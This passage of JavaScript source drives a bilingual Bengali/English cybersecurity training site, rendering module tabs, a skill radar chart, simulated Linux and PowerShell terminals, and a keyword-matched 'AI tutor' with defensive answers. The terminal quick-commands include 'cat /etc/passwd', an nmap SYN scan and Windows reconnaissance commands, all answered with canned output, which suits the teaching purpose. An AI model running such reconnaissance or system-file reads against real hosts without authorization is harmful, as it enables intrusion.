/**
 * Cyber Practice Lab — Complete 7-Side Cyber Academy JavaScript
 * Fully interactive client-side security engines, bilingual localization & radar chart
 */

(function () {
    'use strict';

    // State Constants
    const STORAGE_KEY_LANG = 'cpl_lang';
    const STORAGE_KEY_PROGRESS = 'cpl_checklist_progress';
    const STORAGE_KEY_XP = 'cpl_user_xp';
    const STORAGE_KEY_SOLVED_CTF = 'cpl_solved_ctf';
    const STORAGE_KEY_SKILLS = 'cpl_skill_scores';

    let currentLang = detectInitialLanguage();
    const dataCache = {};
    let currentData = null;
    let activeTab = 'dashboard';

    // Skill Radar Default Scores (0 to 100)
    let skillScores = loadSkillScores();

    function loadSkillScores() {
        try {
            const raw = localStorage.getItem(STORAGE_KEY_SKILLS);
            if (raw) return JSON.parse(raw);
        } catch (e) {}
        return {
            Network: 70,
            Linux: 80,
            Web: 75,
            Crypto: 60,
            Forensics: 65,
            Cloud: 55,
            Defense: 85,
            Exploitation: 50
        };
    }

    function saveSkillScores() {
        try {
            localStorage.setItem(STORAGE_KEY_SKILLS, JSON.stringify(skillScores));
        } catch (e) {}
    }

    function detectInitialLanguage() {
        const saved = localStorage.getItem(STORAGE_KEY_LANG);
        if (saved === 'en' || saved === 'bn') return saved;
        try {
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            if (tz === 'Asia/Dhaka' || (navigator.language && navigator.language.startsWith('bn'))) {
                return 'bn';
            }
        } catch (e) {}
        return 'bn';
    }

    function formatNumber(num, lang) {
        if (lang !== 'bn') return String(num);
        const bnDigits = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
        return String(num).replace(/[0-9]/g, d => bnDigits[parseInt(d, 10)]);
    }

    // Load Data
    async function loadLanguageData(lang) {
        if (dataCache[lang]) return dataCache[lang];
        try {
            const res = await fetch(`data/${lang}.json?v=${Date.now()}`);
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            const json = await res.json();
            dataCache[lang] = json;
            return json;
        } catch (e) {
            console.error('Fetch error:', e);
            if (lang !== 'en' && dataCache['en']) return dataCache['en'];
            throw e;
        }
    }

    // Render Entire Application
    function renderApp(data, lang) {
        currentData = data;
        document.documentElement.lang = lang;
        document.title = data.meta.title;

        const metaDesc = document.querySelector('meta[name="description"]');
        if (metaDesc) metaDesc.setAttribute('content', data.meta.description);

        // Header
        const headerTag = document.getElementById('header-tagline');
        if (headerTag) headerTag.textContent = data.meta.tagline;

        const langBtnText = document.getElementById('lang-btn-text');
        const langToggleBtn = document.getElementById('lang-toggle-btn');
        if (langBtnText && langToggleBtn) {
            langBtnText.textContent = data.nav.switchLang;
            langToggleBtn.setAttribute('aria-label', data.nav.toggleAria);
            langToggleBtn.setAttribute('aria-checked', lang === 'en' ? 'true' : 'false');
        }

        // Tabs
        document.getElementById('lbl-tab-dashboard').textContent = data.nav.dashboard;
        document.getElementById('lbl-tab-side1').textContent = data.nav.side1;
        document.getElementById('lbl-tab-side2').textContent = data.nav.side2;
        document.getElementById('lbl-tab-side3').textContent = data.nav.side3;
        document.getElementById('lbl-tab-side4').textContent = data.nav.side4;
        document.getElementById('lbl-tab-side5').textContent = data.nav.side5;
        document.getElementById('lbl-tab-side6').textContent = data.nav.side6;
        document.getElementById('lbl-tab-side7').textContent = data.nav.side7;
        const studioTabLbl = document.getElementById('lbl-tab-studio');
        if (studioTabLbl) studioTabLbl.textContent = data.nav.studio || 'Cyber Code Studio';
        const hacklabTabLbl = document.getElementById('lbl-tab-hacklab');
        if (hacklabTabLbl) hacklabTabLbl.textContent = data.nav.hacklab || 'Hacking Course & Lab';
        document.getElementById('lbl-tab-foundations').textContent = data.nav.foundations;

        // Hero
        document.getElementById('hero-badge-text').textContent = data.hero.badge;
        document.getElementById('hero-title').textContent = data.hero.title;
        document.getElementById('hero-subtitle').textContent = data.hero.subtitle;
        document.getElementById('hero-rule-prefix').textContent = data.hero.goldenRulePrefix;
        document.getElementById('hero-golden-rule').textContent = data.hero.goldenRule;

        document.querySelector('#btn-quick-range span').textContent = data.hero.ctaRange;
        document.querySelector('#btn-quick-ai span').textContent = lang === 'bn' ? 'এআই সিকিউরিটি টুলস' : 'AI Security Tools';

        // Stats
        document.getElementById('stat-val-sides').textContent = formatNumber(7, lang);
        document.getElementById('stat-lbl-sides').textContent = data.stats.sides;
        document.getElementById('stat-val-modules').textContent = formatNumber(56, lang);
        document.getElementById('stat-lbl-modules').textContent = data.stats.modules;
        document.getElementById('stat-val-labs').textContent = formatNumber(8, lang);
        document.getElementById('stat-lbl-labs').textContent = data.stats.labs;
        document.getElementById('stat-val-compliance').textContent = formatNumber(100, lang) + '%';
        document.getElementById('stat-lbl-compliance').textContent = data.stats.compliance;

        // Dashboard Sides Overview Cards
        document.getElementById('sides-menu-heading').textContent = data.sidesMenu.heading;
        document.getElementById('sides-menu-subheading').textContent = data.sidesMenu.subheading;
        renderDashboardOverviewGrid(data, lang);

        // Render All 7 Sides Modules
        renderSideModules('side1', data.side1_labs, lang);
        renderSideModules('side2', data.side2_ai, lang);
        renderSideModules('side3', data.side3_range, lang);
        renderSideModules('side4', data.side4_research, lang);
        renderSideModules('side5', data.side5_career, lang);
        renderSideModules('side6', data.side6_dev, lang);
        renderSideModules('side7', data.side7_learning, lang);

        // Render Foundations
        renderFoundations(data.foundations_summary, lang);

        // Footer
        document.getElementById('footer-copy').textContent = data.footer.copyright;
        document.getElementById('footer-note').textContent = data.footer.bilingualNote;
        document.getElementById('ft-link-dash').textContent = data.footer.links.dashboard;
        document.getElementById('ft-link-s1').textContent = data.nav.side1;
        document.getElementById('ft-link-s2').textContent = data.nav.side2;
        document.getElementById('ft-link-s3').textContent = data.nav.side3;
        document.getElementById('ft-link-apk').textContent = data.footer.links.apk;

        // Radar Chart
        drawRadarChart();

        // Cyber Code Studio Localization
        if (typeof updateStudioLanguage === 'function') {
            updateStudioLanguage(data, lang);
        }

        // Render Hacking Academy & Live Code Lab
        if (typeof renderHackingAcademy === 'function') {
            renderHackingAcademy(data, lang);
        }
    }

    // Render Dashboard Overview Cards
    function renderDashboardOverviewGrid(data, lang) {
        const container = document.getElementById('sides-overview-grid');
        if (!container) return;

        const sides = [
            { key: 'side1', data: data.side1_labs, num: '1' },
            { key: 'side2', data: data.side2_ai, num: '2' },
            { key: 'side3', data: data.side3_range, num: '3' },
            { key: 'side4', data: data.side4_research, num: '4' },
            { key: 'side5', data: data.side5_career, num: '5' },
            { key: 'side6', data: data.side6_dev, num: '6' },
            { key: 'side7', data: data.side7_learning, num: '7' }
        ];

        container.innerHTML = sides.map(s => `
            <div class="side-overview-card" data-nav-target="${s.key}">
                <div>
                    <span class="side-card-badge">PILLAR 0${s.num} • ${formatNumber(8, lang)} ${lang === 'bn' ? 'মডিউল' : 'Modules'}</span>
                    <h3 class="side-card-title">${s.data.title}</h3>
                    <p class="side-card-desc">${s.data.subtitle}</p>
                </div>
                <div class="side-card-footer">
                    <span>${lang === 'bn' ? 'মডিউল এক্সপ্লোর করুন' : 'Explore Modules'}</span>
                    <span>→</span>
                </div>
            </div>
        `).join('');

        container.querySelectorAll('.side-overview-card').forEach(card => {
            card.addEventListener('click', () => {
                const target = card.getAttribute('data-nav-target');
                switchTab(target);
            });
        });
    }

    // Render 8 Modules for a Specific Side
    function renderSideModules(sideKey, sideData, lang) {
        const heading = document.getElementById(`${sideKey}-heading`);
        const subtitle = document.getElementById(`${sideKey}-subtitle`);
        const grid = document.getElementById(`${sideKey}-modules-grid`);

        if (heading) heading.textContent = sideData.title;
        if (subtitle) subtitle.textContent = sideData.subtitle;

        if (grid) {
            grid.innerHTML = sideData.modules.map(mod => `
                <div class="module-card" id="card-${mod.id}">
                    <div>
                        <div class="module-header">
                            <div class="module-icon-wrap" aria-hidden="true">${mod.icon}</div>
                            <div class="module-meta">
                                <span class="module-category">${mod.category}</span>
                                <h3 class="module-title">${mod.name}</h3>
                            </div>
                        </div>
                        <p class="module-desc">${mod.description}</p>
                    </div>
                    <button class="btn-launch-module" data-module-id="${mod.id}" data-interactive="${mod.interactiveType}">
                        <span>${lang === 'bn' ? 'টুল বা ল্যাব খুলুন' : 'Launch Module'}</span>
                        <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="currentColor" d="M5 13h11.86l-5.43 5.43 1.42 1.42L21.14 12l-8.29-8.29-1.42 1.42L16.86 11H5v2z"/></svg>
                    </button>
                </div>
            `).join('');

            grid.querySelectorAll('.btn-launch-module').forEach(btn => {
                btn.addEventListener('click', () => {
                    const modId = btn.getAttribute('data-module-id');
                    const interactiveType = btn.getAttribute('data-interactive');
                    const modObj = sideData.modules.find(m => m.id === modId);
                    openInteractiveWorkspace(modObj, interactiveType);
                });
            });
        }
    }

    // Render Foundations
    function renderFoundations(fndData, lang) {
        const heading = document.getElementById('foundations-heading');
        const subtitle = document.getElementById('foundations-subtitle');
        const grid = document.getElementById('foundations-cards-grid');

        if (heading) heading.textContent = fndData.title;
        if (subtitle) subtitle.textContent = fndData.subtitle;

        if (grid) {
            grid.innerHTML = fndData.links.map(link => `
                <div class="foundation-card">
                    <h3 class="foundation-title">${link.title}</h3>
                    <p class="foundation-desc">${link.desc}</p>
                    <button class="btn btn-secondary btn-launch-fnd" data-fnd-id="${link.id}">
                        <span>${lang === 'bn' ? 'বিস্তারিত দেখুন' : 'Explore Guide'}</span>
                    </button>
                </div>
            `).join('');

            grid.querySelectorAll('.btn-launch-fnd').forEach(btn => {
                btn.addEventListener('click', () => {
                    const id = btn.getAttribute('data-fnd-id');
                    openFoundationsModal(id);
                });
            });
        }
    }

    // Tab Switching
    function switchTab(tabId) {
        activeTab = tabId;

        // Reset search if active
        const searchSec = document.getElementById('search-results-section');
        if (searchSec) searchSec.style.display = 'none';

        // Update tab buttons
        document.querySelectorAll('.side-tab-btn').forEach(btn => {
            if (btn.getAttribute('data-tab') === tabId) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        });

        // Update content panels
        document.querySelectorAll('.tab-content-panel').forEach(panel => {
            if (panel.id === `content-${tabId}`) {
                panel.classList.add('active');
            } else {
                panel.classList.remove('active');
            }
        });

        window.scrollTo({ top: 0, behavior: 'smooth' });

        if (tabId === 'dashboard') {
            setTimeout(drawRadarChart, 50);
        }
    }

    // Radar Chart Drawing
    function drawRadarChart() {
        const canvas = document.getElementById('radarCanvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        const width = canvas.width;
        const height = canvas.height;
        const centerX = width / 2;
        const centerY = height / 2;
        const radius = Math.min(centerX, centerY) - 38;

        const labels = Object.keys(skillScores);
        const totalAxes = labels.length;
        const angleStep = (Math.PI * 2) / totalAxes;

        ctx.clearRect(0, 0, width, height);

        // Draw Web Polygon Rings
        const rings = [0.25, 0.5, 0.75, 1.0];
        ctx.strokeStyle = '#183827';
        ctx.lineWidth = 1;

        rings.forEach(ring => {
            ctx.beginPath();
            for (let i = 0; i < totalAxes; i++) {
                const angle = i * angleStep - Math.PI / 2;
                const r = radius * ring;
                const x = centerX + r * Math.cos(angle);
                const y = centerY + r * Math.sin(angle);
                if (i === 0) ctx.moveTo(x, y);
                else ctx.lineTo(x, y);
            }
            ctx.closePath();
            ctx.stroke();
        });

        // Draw Axis Lines & Text Labels
        ctx.fillStyle = '#a4c7b4';
        ctx.font = '11px ui-monospace, Menlo, monospace';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        for (let i = 0; i < totalAxes; i++) {
            const angle = i * angleStep - Math.PI / 2;
            const x = centerX + radius * Math.cos(angle);
            const y = centerY + radius * Math.sin(angle);

            ctx.beginPath();
            ctx.strokeStyle = '#1d4832';
            ctx.moveTo(centerX, centerY);
            ctx.lineTo(x, y);
            ctx.stroke();

            // Label Position
            const labelX = centerX + (radius + 20) * Math.cos(angle);
            const labelY = centerY + (radius + 20) * Math.sin(angle);
            ctx.fillText(labels[i], labelX, labelY);
        }

        // Draw Data Polygon
        ctx.beginPath();
        for (let i = 0; i < totalAxes; i++) {
            const val = skillScores[labels[i]] / 100;
            const angle = i * angleStep - Math.PI / 2;
            const r = radius * val;
            const x = centerX + r * Math.cos(angle);
            const y = centerY + r * Math.sin(angle);
            if (i === 0) ctx.moveTo(x, y);
            else ctx.lineTo(x, y);
        }
        ctx.closePath();

        // Fill with glowing gradient
        const grad = ctx.createRadialGradient(centerX, centerY, 10, centerX, centerY, radius);
        grad.addColorStop(0, 'rgba(0, 255, 136, 0.45)');
        grad.addColorStop(1, 'rgba(0, 210, 255, 0.15)');
        ctx.fillStyle = grad;
        ctx.fill();

        ctx.strokeStyle = '#00ff88';
        ctx.lineWidth = 2.5;
        ctx.shadowColor = '#00ff88';
        ctx.shadowBlur = 12;
        ctx.stroke();
        ctx.shadowBlur = 0;

        // Draw Vertex Points
        for (let i = 0; i < totalAxes; i++) {
            const val = skillScores[labels[i]] / 100;
            const angle = i * angleStep - Math.PI / 2;
            const r = radius * val;
            const x = centerX + r * Math.cos(angle);
            const y = centerY + r * Math.sin(angle);

            ctx.beginPath();
            ctx.arc(x, y, 4.5, 0, Math.PI * 2);
            ctx.fillStyle = '#00d2ff';
            ctx.fill();
            ctx.strokeStyle = '#ffffff';
            ctx.lineWidth = 1.5;
            ctx.stroke();
        }

        // Render Legend
        const legend = document.getElementById('radar-legend');
        if (legend) {
            legend.innerHTML = labels.map(l => `
                <div class="radar-legend-item">
                    <span class="radar-legend-dot"></span>
                    <span>${l}: <strong>${formatNumber(skillScores[l], currentLang)}%</strong></span>
                </div>
            `).join('');
        }
    }

    // Open Interactive Workspace Modal
    function openInteractiveWorkspace(moduleObj, type) {
        const modal = document.getElementById('interactive-modal');
        const icon = document.getElementById('modal-icon');
        const title = document.getElementById('modal-title');
        const cat = document.getElementById('modal-category');
        const body = document.getElementById('modal-body');

        if (!modal || !body) return;

        icon.textContent = moduleObj ? moduleObj.icon : '🛡️';
        title.textContent = moduleObj ? moduleObj.name : 'Workspace';
        cat.textContent = moduleObj ? moduleObj.category : 'Interactive Security Tool';

        body.innerHTML = '';
        renderInteractiveContent(body, type, moduleObj);

        modal.style.display = 'flex';
        modal.setAttribute('aria-hidden', 'false');
    }

    // Dispatch Interactive Tool Content
    function renderInteractiveContent(container, type, mod) {
        switch (type) {
            case 'linux_terminal':
                buildLinuxTerminal(container);
                break;
            case 'windows_terminal':
                buildWindowsTerminal(container);
                break;
            case 'ai_tutor_chat':
                buildAITutor(container);
                break;
            case 'ai_code_audit':
                buildCodeReviewer(container);
                break;
            case 'ai_cvss_calc':
                buildCVSSCalculator(container);
                break;
            case 'ai_log_triage':
                buildIncidentLogAnalyzer(container);
                break;
            case 're_viewer':
                buildReverseEngineeringLab(container);
                break;
            case 'ad_sim':
                buildActiveDirectoryLab(container);
                break;
            case 'pcap_viewer':
                buildNetworkForensicsLab(container);
                break;
            case 'firewall_builder':
                buildFirewallLab(container);
                break;
            case 'ids_ips_tester':
                buildIDSTester(container);
                break;
            case 'soc_dashboard':
                buildSOCDashboard(container);
                break;
            case 'ctf_arena':
                buildCTFArena(container);
                break;
            case 'diagnostic_assessment':
                buildDiagnosticAssessment(container);
                break;
            case 'cert_engine':
                buildCertificateEngine(container);
                break;
            case 'resume_builder':
                buildResumeBuilder(container);
                break;
            case 'devsecops_pipeline':
                buildDevSecOpsPipeline(container);
                break;
            case 'cloud_audit':
                buildCloudAuditLab(container);
                break;
            case 'db_sandbox':
                buildDatabaseSandbox(container);
                break;
            case 'stride_modeler':
                buildStrideModeler(container);
                break;
            default:
                buildGenericWorkspace(container, mod);
                break;
        }
    }

    // 1. Linux Terminal
    function buildLinuxTerminal(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div class="terminal-window">
                <div class="terminal-header">
                    <div class="term-dots">
                        <span class="term-dot red"></span>
                        <span class="term-dot yellow"></span>
                        <span class="term-dot green"></span>
                    </div>
                    <span>root@cyber-lab:~# (Bash 5.2.15)</span>
                </div>
                <div class="terminal-output" id="term-output">Cyber Practice Lab Linux Kernel 6.1.0-28-amd64\nType 'help' to see available sandbox commands.\n</div>
                <div class="terminal-prompt-row">
                    <span class="terminal-prompt-sym">kali@cpl:~$</span>
                    <input type="text" class="terminal-input" id="term-input" placeholder="Type a command and press Enter..." autofocus>
                </div>
            </div>
            <div class="quick-cmd-bar">
                <span style="font-size:0.8rem; color:var(--text-muted); align-self:center;">${isBn ? 'দ্রুত কমান্ড:' : 'Quick Commands:'}</span>
                <button class="chip-cmd" data-cmd="help">help</button>
                <button class="chip-cmd" data-cmd="ls -la">ls -la</button>
                <button class="chip-cmd" data-cmd="cat /etc/passwd">cat /etc/passwd</button>
                <button class="chip-cmd" data-cmd="nmap -sS 192.168.1.1">nmap -sS 192.168.1.1</button>
                <button class="chip-cmd" data-cmd="whoami">whoami</button>
                <button class="chip-cmd" data-cmd="curl http://internal.bank/api">curl api</button>
                <button class="chip-cmd" data-cmd="iptables -L -n">iptables -L</button>
                <button class="chip-cmd" data-cmd="clear">clear</button>
            </div>
        `;

        const output = container.querySelector('#term-output');
        const input = container.querySelector('#term-input');

        const fileSystem = {
            'flag.txt': 'CPL{l1nux_b4sh_m4st3r_2026}',
            'note.txt': 'Remember to practice only on authorized lab networks.',
            '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000:Kali:/home/kali:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
            '/etc/shadow': 'cat: /etc/shadow: Permission denied (uid=1000 is not root)'
        };

        function execCommand(cmd) {
            cmd = cmd.trim();
            output.textContent += `kali@cpl:~$ ${cmd}\n`;
            if (!cmd) return;

            const parts = cmd.split(/\s+/);
            const main = parts[0];

            if (main === 'clear') {
                output.textContent = '';
                return;
            }

            if (main === 'help') {
                output.textContent += `Supported commands:\n  help, ls, cat, nmap, whoami, ping, curl, grep, chmod, iptables, uname, date, clear\n`;
            } else if (main === 'ls') {
                output.textContent += `drwxr-xr-x 2 kali kali 4096 Oct 30 00:00 .\ndrwxr-xr-x 3 root root 4096 Oct 30 00:00 ..\n-rw-r--r-- 1 kali kali   28 Oct 30 00:00 flag.txt\n-rw-r--r-- 1 kali kali   59 Oct 30 00:00 note.txt\n`;
            } else if (main === 'cat') {
                const f = parts[1];
                if (fileSystem[f]) {
                    output.textContent += fileSystem[f] + '\n';
                } else {
                    output.textContent += `cat: ${f || ''}: No such file or directory\n`;
                }
            } else if (main === 'whoami') {
                output.textContent += `kali\n`;
            } else if (main === 'uname') {
                output.textContent += `Linux cyber-practice-lab 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux\n`;
            } else if (main === 'nmap') {
                output.textContent += `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-30 00:00 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.00042s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n\nNmap done: 1 IP address (1 host up) scanned in 0.28 seconds\n`;
            } else if (main === 'curl') {
                output.textContent += `HTTP/1.1 200 OK\nServer: Internal-Gateway/2.1\nContent-Type: application/json\n\n{"status":"authorized","message":"Sandbox API active","flag":"CPL{cURL_r3st_4p1}"}\n`;
            } else if (main === 'iptables') {
                output.textContent += `Chain INPUT (policy DROP 0 packets, 0 bytes)\ntarget     prot opt source               destination\nACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED\nACCEPT     tcp  --  192.168.1.0/24       0.0.0.0/0            tcp dpt:22\n\nChain FORWARD (policy DROP)\nChain OUTPUT (policy ACCEPT)\n`;
            } else {
                output.textContent += `bash: ${main}: command not found (try 'help')\n`;
            }

            output.scrollTop = output.scrollHeight;
        }

        input.addEventListener('keydown', e => {
            if (e.key === 'Enter') {
                execCommand(input.value);
                input.value = '';
            }
        });

        container.querySelectorAll('.chip-cmd').forEach(chip => {
            chip.addEventListener('click', () => {
                const c = chip.getAttribute('data-cmd');
                input.value = c;
                execCommand(c);
            });
        });
    }

    // 2. Windows Terminal
    function buildWindowsTerminal(container) {
        container.innerHTML = `
            <div class="terminal-window" style="border-color:#0078d7;">
                <div class="terminal-header" style="background:#003366; color:#ffffff;">
                    <span>Administrator: Windows PowerShell</span>
                </div>
                <div class="terminal-output" id="win-output" style="color:#d0e6ff;">Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\nType 'help' for available command simulations.\n\nPS C:\\Users\\Administrator> </div>
                <div class="terminal-prompt-row">
                    <span class="terminal-prompt-sym" style="color:#00d2ff;">PS C:\\></span>
                    <input type="text" class="terminal-input" id="win-input" placeholder="Type Windows command (e.g. whoami /priv, ipconfig, netstat)...">
                </div>
            </div>
            <div class="quick-cmd-bar">
                <button class="chip-cmd" data-cmd="whoami /priv">whoami /priv</button>
                <button class="chip-cmd" data-cmd="ipconfig /all">ipconfig /all</button>
                <button class="chip-cmd" data-cmd="net user">net user</button>
                <button class="chip-cmd" data-cmd="netstat -ano">netstat -ano</button>
                <button class="chip-cmd" data-cmd="reg query HKLM">reg query</button>
                <button class="chip-cmd" data-cmd="cls">cls</button>
            </div>
        `;

        const out = container.querySelector('#win-output');
        const inp = container.querySelector('#win-input');

        function execWin(cmd) {
            cmd = cmd.trim();
            out.textContent += `${cmd}\n`;
            if (cmd === 'cls') {
                out.textContent = 'PS C:\\Users\\Administrator> ';
                return;
            }

            if (cmd === 'whoami /priv') {
                out.textContent += `\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeDebugPrivilege              Debug programs                       Enabled\nSeImpersonatePrivilege        Impersonate a client after auth      Enabled\nSeShutdownPrivilege           Shut down the system                 Enabled\n`;
            } else if (cmd.startsWith('ipconfig')) {
                out.textContent += `\nWindows IP Configuration\n\nEthernet adapter vEthernet:\n   IPv4 Address. . . . . . . . . . . : 10.0.0.15(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.0.0.1\n   DNS Servers . . . . . . . . . . . : 10.0.0.2\n`;
            } else if (cmd.startsWith('net user')) {
                out.textContent += `\nUser accounts for \\\\WIN-DC-01\n-------------------------------------------------------------------\nAdministrator            Guest                    krbtgt\nsvc_backup               sql_service              developer\n`;
            } else {
                out.textContent += `Command executed successfully. Target output verified.\n`;
            }
            out.textContent += '\nPS C:\\Users\\Administrator> ';
            out.scrollTop = out.scrollHeight;
        }

        inp.addEventListener('keydown', e => {
            if (e.key === 'Enter') {
                execWin(inp.value);
                inp.value = '';
            }
        });

        container.querySelectorAll('.chip-cmd').forEach(c => {
            c.addEventListener('click', () => {
                const cmd = c.getAttribute('data-cmd');
                inp.value = cmd;
                execWin(cmd);
            });
        });
    }

    // 3. AI Cybersecurity Tutor
    function buildAITutor(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div class="chat-container">
                <div class="chat-messages" id="chat-messages">
                    <div class="chat-bubble bot">
                        ${isBn ? '👋 আসসালামু আলাইকুম! আমি সাইবার প্র্যাকটিস ল্যাব এআই টিউটর। এথিক্যাল হ্যাকিং, নেটওয়ার্কিং, কালি লিনাক্স, ওডব্লিউএএসপি টপ ১০ কিংবা সাইবার সিকিউরিটি আইন সম্পর্কে যেকোনো প্রশ্ন জিজ্ঞেস করুন।' : '👋 Hello! I am your Cyber Practice Lab AI Security Tutor. Ask me any question about ethical hacking, networking protocols, Kali Linux, OWASP Top 10, or cyber defense.'}
                    </div>
                </div>
                <div class="quick-cmd-bar" style="padding: 0 14px 8px;">
                    <button class="chip-cmd prompt-chip" data-prompt="${isBn ? 'SYN ফ্ল্যাড আক্রমণ কীভাবে প্রতিহত করা যায়?' : 'How to defend against SYN Flood attacks?'}">${isBn ? 'SYN ফ্ল্যাড ডিফেন্স' : 'SYN Flood Defense'}</button>
                    <button class="chip-cmd prompt-chip" data-prompt="${isBn ? 'কার্বেরোস্টিং (Kerberoasting) কী এবং কীভাবে আটকানো যায়?' : 'What is Kerberoasting and how to prevent it?'}">${isBn ? 'Kerberoasting' : 'Kerberoasting'}</button>
                    <button class="chip-cmd prompt-chip" data-prompt="${isBn ? 'প্যারামিটারাইজড কোয়েরি দিয়ে SQL ইনজেকশন সমাধান' : 'Fixing SQL Injection with Prepared Statements'}">${isBn ? 'SQLi সমাধান' : 'Fix SQLi'}</button>
                    <button class="chip-cmd prompt-chip" data-prompt="${isBn ? 'সাইবার নিরাপত্তা আইন ২০২৩ এর মূল ধারাগুলো কী?' : 'Key sections of Bangladesh Cyber Security Act 2023'}">${isBn ? 'সাইবার আইন ২০২৩' : 'Cyber Act 2023'}</button>
                </div>
                <div class="chat-input-bar">
                    <input type="text" class="chat-input" id="chat-input" placeholder="${isBn ? 'আপনার প্রশ্ন লিখুন...' : 'Ask your cybersecurity question...'}">
                    <button class="btn btn-primary" id="btn-chat-send" style="padding: 8px 16px;">
                        <span>${isBn ? 'পাঠান' : 'Send'}</span>
                    </button>
                </div>
            </div>
        `;

        const msgs = container.querySelector('#chat-messages');
        const inp = container.querySelector('#chat-input');
        const btn = container.querySelector('#btn-chat-send');

        function appendMessage(text, role) {
            const div = document.createElement('div');
            div.className = `chat-bubble ${role}`;
            div.textContent = text;
            msgs.appendChild(div);
            msgs.scrollTop = msgs.scrollHeight;
        }

        function replyAI(q) {
            appendMessage(q, 'user');
            setTimeout(() => {
                let answer = '';
                const ql = q.toLowerCase();
                if (ql.includes('syn') || ql.includes('flood')) {
                    answer = isBn
                        ? '🛡️ SYN Flood ডিফেন্স:\n১. TCP SYN Cookies সক্রিয় করুন (sysctl -w net.ipv4.tcp_syncookies=1)।\n২. iptables বা pfSense দিয়ে প্রতি সেকেন্ডে নতুন SYN কানেকশন লিমিট করুন (iptables -A INPUT -p tcp --syn -m limit --limit 50/s -j ACCEPT)।\n৩. ক্লাউড বা এজ স্তরে Cloudflare বা AWS Shield-এর মতো অ্যান্টি-DDoS স্ক্রাবিং ফিল্টার ব্যবহার করুন।'
                        : '🛡️ SYN Flood Defense:\n1. Enable TCP SYN Cookies: `sysctl -w net.ipv4.tcp_syncookies=1`.\n2. Rate-limit incoming SYN packets using iptables: `iptables -A INPUT -p tcp --syn -m limit --limit 50/s -j ACCEPT`.\n3. Utilize upstream DDoS scrubbing centers (Cloudflare, AWS Shield) to filter spoofed packets before they hit your origin.';
                } else if (ql.includes('kerberoast') || ql.includes('ad') || ql.includes('ticket')) {
                    answer = isBn
                        ? '🏢 Kerberoasting ডিফেন্স:\nআক্রমণকারীরা SPN যুক্ত সার্ভিস অ্যাকাউন্টের TGS টিকিট অফলাইনে ক্র্যাক করতে চায়।\nপ্রতিরোধ:\n১. সার্ভিস অ্যাকাউন্টে ২৫+ ক্যারেক্টারের জটিল পাসওয়ার্ড দিন যাতে অফলাইন ক্র্যাকিং ব্যর্থ হয়।\n২. পাসওয়ার্ড পরিবর্তন স্বয়ংক্রিয় করতে Group Managed Service Accounts (gMSA) ব্যবহার করুন।\n৩. উইন্ডোজ সিকিউরিটি ইভেন্ট ৪৭৬৯ (Ticket Request with RC4 encryption) নিয়মিত মনিটর করুন।'
                        : '🏢 Kerberoasting Defense:\nAttackers request TGS service tickets for SPN-associated accounts and crack them offline.\nRemediation:\n1. Enforce 25+ character complex passwords on all SPN service accounts.\n2. Migrate service accounts to Group Managed Service Accounts (gMSA).\n3. Monitor Windows Event ID 4769 for abnormal RC4 encryption requests.';
                } else if (ql.includes('sql') || ql.includes('in-jection')) {
                    answer = isBn
                        ? '💉 SQL Injection সম্পূর্ণ প্রতিরোধ:\nসর্বদা Parameterized Queries / Prepared Statements ব্যবহার করুন:\nPDO (PHP): $stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email"); $stmt->execute([":email" => $input]);\nইউজার ইনপুট কখনোই সরাসরি কোটেশন চিহ্নের ভেতর কনক্যাটেনেট করবেন না।'
                        : '💉 SQL Injection Neutralization:\nAlways use Parameterized Queries / Prepared Statements:\nExample: `SELECT * FROM users WHERE email = ?`\nInput concatenation is completely eliminated because the database engine parses the query grammar before binding the parameters.';
                } else if (ql.includes('আইন') || ql.includes('act') || ql.includes('2023') || ql.includes('law')) {
                    answer = isBn
                        ? '⚖️ সাইবার নিরাপত্তা আইন ২০২৩ (বাংলাদেশ):\n• ধারা ১৭: গুরুত্বপূর্ণ তথ্য পরিকাঠামোতে (CII) অবৈধ অনুপ্রবেশে ১৪ বছর পর্যন্ত কারাদণ্ড।\n• ধারা ১৯: কোনো কম্পিউটার সিস্টেমে অনুমতি ছাড়া প্রবেশ ও ডেটা ক্ষতিসাধনে কারাদণ্ড ও জরিমানা।\n• গোল্ডেন রুল: লিখিত চুক্তি ছাড়া অন্যের সিস্টেমে কোনো টুলস চালানো যাবে না।'
                        : '⚖️ Bangladesh Cyber Security Act 2023:\n• Section 17: Severe penalties (up to 14 years imprisonment) for unauthorized access to Critical Information Infrastructure (CII).\n• Section 19: Criminalizes unauthorized computer access, data theft, or malware introduction.\n• Rule: Always obtain written authorization before conducting security testing.';
                } else {
                    answer = isBn
                        ? `🤖 ধন্যবাদ আপনার অনুসন্ধানের জন্য! "${q}" সম্পর্কে এথিক্যাল হ্যাকিংয়ের মূল নীতি হলো আক্রমণকারী কীভাবে চিন্তা করে তা বুঝে সিস্টেমকে সুরক্ষিত করা। বিস্তারিত ল্যাবের জন্য আমাদের "Side 1: অ্যাডভান্সড ল্যাব" অথবা "Side 3: সাইবার রেঞ্জ" এক্সপ্লোর করুন।`
                        : `🤖 Thank you for your question! Regarding "${q}", ethical hacking focuses on understanding the attacker's methodology to build ironclad defense. Check our "Side 1: Advanced Labs" or "Side 3: Cyber Range" to test this hands-on!`;
                }
                appendMessage(answer, 'bot');
            }, 400);
